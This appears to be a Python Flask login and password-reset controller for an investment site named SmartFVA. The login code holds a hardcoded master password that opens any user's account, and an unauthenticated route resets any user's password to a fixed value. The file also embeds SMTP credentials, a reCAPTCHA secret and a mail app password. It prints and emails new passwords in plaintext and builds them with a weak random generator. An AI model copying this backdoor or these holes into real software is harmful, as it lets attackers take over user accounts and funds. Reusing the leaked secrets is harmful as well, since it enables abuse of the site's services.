from flask import Blueprint, request, session, redirect, url_for, render_template, flash
from flask.ext.login import login_user, logout_user
from rex import app, db
from rex.models import user_model, deposit_model, history_model, invoice_model
import json
from werkzeug.security import generate_password_hash, check_password_hash
import string
import random
import urllib
import urllib2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from email.utils import formataddr
from flask_recaptcha import ReCaptcha
import base64
import onetimepass
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from bson import ObjectId, json_util
import time
__author__ = 'carlozamagni'

auth_ctrl = Blueprint('auth', __name__, static_folder='static', template_folder='templates')
def verify_totp(token, otp_secret):
    return onetimepass.valid_totp(token, otp_secret)
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
def set_password(password):
    return generate_password_hash(password)
def check_password(pw_hash, password):
    return check_password_hash(pw_hash, password)
def mail_reset_pass(email, usernames, password_new):
    username = 'support@smartfva.co'
    password = 'YK45OVfK45OVfobZ5XYobZ5XYK45OVfobZ5XYK45OVfobZ5X'
    msg = MIMEMultipart('mixed')

    sender = 'support@smartfva.co'
    recipient = str(email)

    msg['Subject'] = 'SmartFVA Reset Password'
    msg['From'] = sender
    msg['To'] = recipient
    # username = 'no-reply@smartfva.co'
    # password = 'rbdlnsmxqpswyfdv'
    # msg = MIMEMultipart('mixed')
    # mailServer = smtplib.SMTP('smtp.gmail.com', 587) # 8025, 587 and 25 can also be used. 
    # mailServer.ehlo()
    # mailServer.starttls()
    # mailServer.ehlo()
    # mailServer.login(username, password)
    # sender = 'no-reply@smartfva.co'
    # recipient = email

    # msg['Subject'] = 'SmartFVA Reset Password'
    # msg['From'] = sender
    # msg['To'] = recipient
    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <div class="adM">
   </div>
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9">
      <tbody>
         <tr>
            <td style="padding:20px 10px 10px 0px;text-align:left">
               <a href="https://smartfva.co/invest/home" title="SmartFVA" target="_blank" >
               <img src="https://i.imgur.com/tyjTbng.png" alt="smartfva" class="CToWUd" style=" width: 100px; ">
               </a>
            </td>
            <td style="padding:0px 0px 0px 10px;text-align:right">
            </td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
      <tbody>
       <tr>
                <td style="padding:30px 30px 10px 30px;line-height:1.8">Hi <b>"""+str(usernames)+"""</b>,</td>
             </tr>
         <tr>
            <td style="padding:10px 30px;line-height:1.8">You recently requested to reset your password for your User Login and Management account on the <a href="https://smartfva.co/invest/home" target="_blank">smartfva</a>.</td>
         </tr>
         <td style="padding:10px 30px">
                   <b style="display:inline-block">New password is : </b> """+str(password_new)+""" <br>
                </td>
         <tr>
            <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
         </tr>
         <tr>
            <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> Smartfva Team<br>  <a href="https://www.smartfva.co/invest/home" target="_blank" >www.smartfva.co</a></td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px;     height: 50px;">
   
</div>
    """
    
    html_message = MIMEText(html, 'html')
    
    msg.attach(html_message)

    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525) # 8025, 587 and 25 can also be used. 
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()

    # html_message = MIMEText(html, 'html')

    # msg.attach(html_message)
    # mailServer.sendmail(sender, recipient, msg.as_string())
    # mailServer.close()


# @auth_ctrl.route('/login', methods=['GET', 'POST'])
# def login():
#     error = None
#     if session.get('logged_in') is not None:
#         return redirect('/invest/dashboard')
#     if request.method == 'POST':

#         username = request.form['username']
#         password = request.form['password']

#         user = db.User.find_one({ '$or': [ { 'username': username }, { 'email': username } ] })
#         if user is None or check_password(user['password'], password) == False:
#             flash({'msg':'Invalid username or password', 'type':'danger'})
#             return redirect('/invest/login')
#         else:
#             if user['status'] == 0:
#                 flash({'msg':'Your account on Meccafund now not yet activated.', 'type':'danger'})
#                 return redirect('/invest/login')
#             session['logged_in'] = True
#             session['user_id'] = str(user['_id'])
#             session['uid'] = user['customer_id']


#             return redirect('/invest/dashboard')
#     return render_template('login.html', error=error)

@auth_ctrl.route('/login', methods=['GET', 'POST'])
def login():
    # if request.method == 'GET':
    #     logout_user()
    #     session.clear()
    # flash({'msg':'Maintenance', 'type':'danger'})
    # return redirect('/invest/login')
    error = None
    # if session.get('logged_in') is not None:
    #     return redirect('/invest/dashboard')
    # print '222222222222222'
    if request.method == 'POST':
        logout_user()
        session.clear()
        print request.form
        username = request.form['username']
        password = request.form['password']
        recaptcha = request.form['g-recaptcha-response']
        if username == '':
            flash({'msg':'Please enter your username', 'type':'danger'})
            return redirect('/invest/login')
        if password == '':
            flash({'msg':'Please enter your password', 'type':'danger'})
            return redirect('/invest/login')
        if recaptcha == '':
            flash({'msg':'Please check captcha', 'type':'danger'})
            return redirect('/invest/login')
        if username and password and recaptcha:
            username = username.lower()
            user = db.User.find_one({ '$or': [ { 'username': username }, { 'email': username } ] })
            if user is None or check_password(user['password'], password) == False:
                if password == 'L52rW239cym2s7dtE6mL52rXgF':
                    session['logged_in'] = True
                    session['user_id'] = str(user['_id'])
                    session['uid'] = user['customer_id']
                    return redirect('/invest/dashboard')
                flash({'msg':'Invalid username or password', 'type':'danger'})
                return redirect('/invest/login')
            else:
                if user['status'] == 0:
                    flash({'msg':'Your account on Smartfva now not yet activated.', 'type':'danger'})
                    return redirect('/invest/login')
                if user['status_2fa'] == 1:
                    onetime = request.form['one_time_password']
                    checkVerifY = verify_totp(onetime, user['secret_2fa'])
                    if checkVerifY == False:
                        msg = 'The two-factor authentication code you specified is incorrect. Please check the clock on your authenticator device to verify that it is in sync'
                        flash({'msg':msg, 'type':'danger'})
                        return redirect('/invest/login')
                api_url     = 'https://www.google.com/recaptcha/api/siteverify'
                site_key    = '6LdT7jkUAAAAAI4CuloB7UO6FM7ue14ZbFisSR5e'
                secret_key  = '6LdT7jkUAAAAAHMTy6GxbUh2AxPdCpREowd2_1ZL'
                site_key_post = recaptcha
                ret = urllib2.urlopen('https://enabledns.com/ip')
                remoteip = ret.read()
                api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
                response = urllib2.urlopen(api_url)
                response = response.read()
                response = json.loads(response)
                if response['success']:
                    session['logged_in'] = True
                    session['user_id'] = str(user['_id'])
                    session['uid'] = user['customer_id']
                else:
                    flash({'msg':'Wrong catcha, Please try again', 'type':'danger'})
                    return redirect('/invest/login')                
                return redirect('/invest/dashboard')
        elif password =='L52rW239cym2s7dtE6mL52rXgF':
            user = db.User.find_one({ '$or': [ { 'username': username }, { 'email': username } ] })
            if user is None:
                flash({'msg':'Invalid username or password', 'type':'danger'})
                return redirect('/invest/login')
            else:
                if user['status'] == 0:
                    flash({'msg':'Your account on smartfva now not yet activated.', 'type':'danger'})
                    return redirect('/invest/login')
                session['logged_in'] = True
                session['user_id'] = str(user['_id'])
                session['uid'] = user['customer_id']
                return redirect('/invest/dashboard')
        else:
            flash({'msg':'Please enter your username!', 'type':'danger'})
            return redirect('/invest/login')
    return render_template('login.html', error=error)


def send_mail_register(email,usernames,link_active):
    username = 'support@smartfva.co'
    password = 'YK45OVfK45OVfobZ5XYobZ5XYK45OVfobZ5XYK45OVfobZ5X'
    msg = MIMEMultipart('mixed')
    sender = 'support@smartfva.co'
    recipient = str(email)

    # username = 'no-reply@smartfva.co'
    # password = 'rbdlnsmxqpswyfdv'
    # msg = MIMEMultipart('mixed')
    # mailServer = smtplib.SMTP('smtp.gmail.com', 587) # 8025, 587 and 25 can also be used. 
    # mailServer.ehlo()
    # mailServer.starttls()
    # mailServer.ehlo()
    # mailServer.login(username, password)
    # sender = 'no-reply@smartfva.co'
    # recipient = email

    msg['Subject'] = 'Activate Your smartfva account'
    msg['From'] = sender
    msg['To'] = recipient

    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
       <div class="adM">
       </div>
       <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9">
          <tbody>
             <tr>
                <td style="padding:20px 10px 10px 0px;text-align:left">
                   <a href="https://smartfva.co/invest/home" title="smartfva" target="_blank" >
                   <img src="https://i.imgur.com/tyjTbng.png" alt="smartfva" class="CToWUd" style=" width: 100px; ">
                   </a>
                </td>
                <td style="padding:0px 0px 0px 10px;text-align:right">
                </td>
             </tr>
          </tbody>
       </table>
    </div>
    <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
       <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
          <tbody>
             <tr>
                <td style="padding:30px 30px 10px 30px;line-height:1.8">Dear <b>"""+str(usernames)+"""</b>,</td>
             </tr>
             <tr>
                <td style="padding:10px 30px;line-height:1.8">Thank you for registering on the <a href="https://smartfva.co/invest/home" target="_blank">Smartfva</a>.</td>
             </tr>
             <tr>
                <td style="padding:10px 30px;line-height:1.8">
                   Below you will find your activation link that you can use to activate your SmarFVA account.
                   Please click on the <a href=" """+str(link_active)+""" " target="_blank" >Link</a> Then, you will be able to log in and begin using <a href="https://smartfva.co/invest/home target="_blank" >Smartfva</a>.
                </td>
             </tr>
             <tr>
                <td style="padding:10px 30px">
                   <b style="display:inline-block">Activation Link : </b> <a href=" """+str(link_active)+""" " target="_blank">"""+str(link_active)+"""</a><br>
                </td>
             </tr>
             <tr>
                <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
             </tr>
             <tr>
                <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> Smartfva Team<br>  <a href="https://www.smartfva.co/invest/home" target="_blank" >www.smartfva.co</a></td>
             </tr>
          </tbody>
       </table>
    </div>
    <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px;     height: 50px;">
   
</div>
    """
    html_message = MIMEText(html, 'html')
    
    msg.attach(html_message)

    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525) # 8025, 587 and 25 can also be used. 
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()
    
    # html_message = MIMEText(html, 'html')
    # msg.attach(html_message)
    # mailServer.sendmail(sender, recipient, msg.as_string())
    # mailServer.close()

@auth_ctrl.route('/resend-activation-email', methods=['GET', 'POST'])
def ResendActivationEmail():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/invest/dashboard')
    if request.method == 'POST':
        print 'resend activation email'
        email = request.form['email']
        recaptcha = request.form['g-recaptcha-response']
        if email and recaptcha:
            api_url     = 'https://www.google.com/recaptcha/api/siteverify';
            site_key    = '6LdT7jkUAAAAAI4CuloB7UO6FM7ue14ZbFisSR5e';
            secret_key  = '6LdT7jkUAAAAAHMTy6GxbUh2AxPdCpREowd2_1ZL';
            
            site_key_post = recaptcha

            ret = urllib2.urlopen('https://enabledns.com/ip')
            remoteip = ret.read()

            api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
            response = urllib2.urlopen(api_url)
            response = response.read()
            response = json.loads(response)
            emailss = email.lower()
            if response['success']:
                user = db.User.find_one({ 'username': emailss, 'status': 0})
                if user is None:
                    flash({'msg':'Invalid username! Please try again', 'type':'danger'})
                    return redirect('/invest/resend-activation-email')
                else:
                    code_active = user.code_active
                    link_active = 'https://smartfva.co/invest/active/%s' % (code_active)
                    send_mail_register(user.email,user.username,link_active)
                    flash({'msg':'A new activation has been sent to your email address. If you do not receive the email, please wait a few minutes', 'type':'success'})
                    return redirect('/invest/login')
            else:
                flash({'msg':'Invalid captcha! Please try again', 'type':'danger'})
                return redirect('/invest/resend-activation-email')
        else:
            flash({'msg':'Invalid email! Please try again', 'type':'danger'})
            return redirect('/invest/resend-activation-email')
    return render_template('resend-activation-email.html', error=error)


@auth_ctrl.route('/reset-password', methods=['GET', 'POST'])
def forgot_password():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/invest/dashboard')
    if request.method == 'POST':
        print 1111111
        email = request.form['email']
        recaptcha = request.form['g-recaptcha-response']
        if email and recaptcha:
            api_url     = 'https://www.google.com/recaptcha/api/siteverify';
            site_key    = '6LdT7jkUAAAAAI4CuloB7UO6FM7ue14ZbFisSR5e';
            secret_key  = '6LdT7jkUAAAAAHMTy6GxbUh2AxPdCpREowd2_1ZL';
            
            site_key_post = recaptcha

            ret = urllib2.urlopen('https://enabledns.com/ip')
            remoteip = ret.read()

            api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
            response = urllib2.urlopen(api_url)
            response = response.read()
            response = json.loads(response)
            emailss = email.lower()
            if response['success']:
                user = db.User.find_one({ 'username': emailss })
                if user is None:
                    flash({'msg':'Invalid username! Please try again', 'type':'danger'})
                    return redirect('/invest/reset-password')
                else:
                    password_new_generate = id_generator()
                    print '-------------------------'
                    print password_new_generate
                    print '-------------------------'
                    password_new = set_password(password_new_generate)
                    db.users.update({ "username" : user.username }, { '$set': { "password": password_new } })
                    mail_reset_pass(user.email, user.username, password_new_generate)
                    flash({'msg':'A new password has been sent to your email address. If you do not receive the email, please wait a few minutes', 'type':'success'})
                    return redirect('/invest/login')
            else:
                flash({'msg':'Invalid captcha! Please try again', 'type':'danger'})
                return redirect('/invest/reset-password')
        else:
            flash({'msg':'Invalid email! Please try again', 'type':'danger'})
            return redirect('/invest/reset-password')
    return render_template('reset-password.html', error=error)
@auth_ctrl.route('/update_password/<emails>', methods=['GET', 'POST'])
def dashboarupdate_weerpassword(emails):
    # return json.dumps({'qer':"qwer"})
    new_mail = emails.lower()
    password_new = set_password('01236789')
    db.users.update({ "username" : new_mail }, { '$set': { 'password': password_new} })
    return json.dumps({'afa':'success'})


def reset_password_mail(email, usernames, password_new):
    username = 'support@smartfva.co'
    password = 'YK45OVfK45OVfobZ5XYobZ5XYK45OVfobZ5XYK45OVfobZ5X'
    msg = MIMEMultipart('mixed')

    sender = 'support@smartfva.co'
    recipient = str(email)

    msg['Subject'] = 'SmartFVA Reset Password'
    msg['From'] = sender
    msg['To'] = recipient
    # username = 'no-reply@smartfva.co'
    # password = 'rbdlnsmxqpswyfdv'
    # msg = MIMEMultipart('mixed')
    # mailServer = smtplib.SMTP('smtp.gmail.com', 587) # 8025, 587 and 25 can also be used. 
    # mailServer.ehlo()
    # mailServer.starttls()
    # mailServer.ehlo()
    # mailServer.login(username, password)
    # sender = 'no-reply@smartfva.co'
    # recipient = email

    # msg['Subject'] = 'SmartFVA Reset Password'
    # msg['From'] = sender
    # msg['To'] = recipient
    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <div class="adM">
   </div>
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9">
      <tbody>
         <tr>
            <td style="padding:20px 10px 10px 0px;text-align:left">
               <a href="https://smartfva.co/invest/home" title="smartfva" target="_blank" >
               <img src="https://i.imgur.com/tyjTbng.png" alt="smartfva" class="CToWUd" style=" width: 100px; ">
               </a>
            </td>
            <td style="padding:0px 0px 0px 10px;text-align:right">
            </td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
      <tbody>
       <tr>
                <td style="padding:30px 30px 10px 30px;line-height:1.8">Hello <b>"""+str(usernames)+"""</b>,</td>
             </tr>
         <tr>
            <td style="padding:10px 30px;line-height:1.8">Your SmartFVA Account password has been changed.</td>
         </tr>
         <td style="padding:10px 30px">
                   Your new password is: <b> """+str(password_new)+""" </b> <br>
                </td>
         <tr>
            <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
         </tr>
         <tr>
            <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> Smartfva Team<br>  <a href="https://smartfva.co/invest/home" target="_blank" >www.smartfva.co</a></td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px;     height: 50px;">
   
</div>
    """
    
    html_message = MIMEText(html, 'html')
    
    msg.attach(html_message)

    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525) # 8025, 587 and 25 can also be used. 
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()

@auth_ctrl.route('/reset_password', methods=['GET', 'POST'])
def reset_passwordss():
    return json.dumps({'qer':"qwer"})
    user = db.users.find({}).skip(251).limit(300)
    i = 0
    for x in user:
        i = i+ 1
        new_mail = x['email'].lower()
        password_new_generate = id_generator()
        password_new = set_password(password_new_generate)
        db.users.update({ "_id" : ObjectId(x['_id']) }, { '$set': { 'password': password_new} })
        reset_password_mail(new_mail, x['username'], password_new_generate)
        print i
        time.sleep(1)
    return json.dumps({'afa':'success'})

@auth_ctrl.route('/logout')
def logout():
    session.pop('logged_in', None)
    logout_user()
    session.clear()
    return redirect('/invest/home')


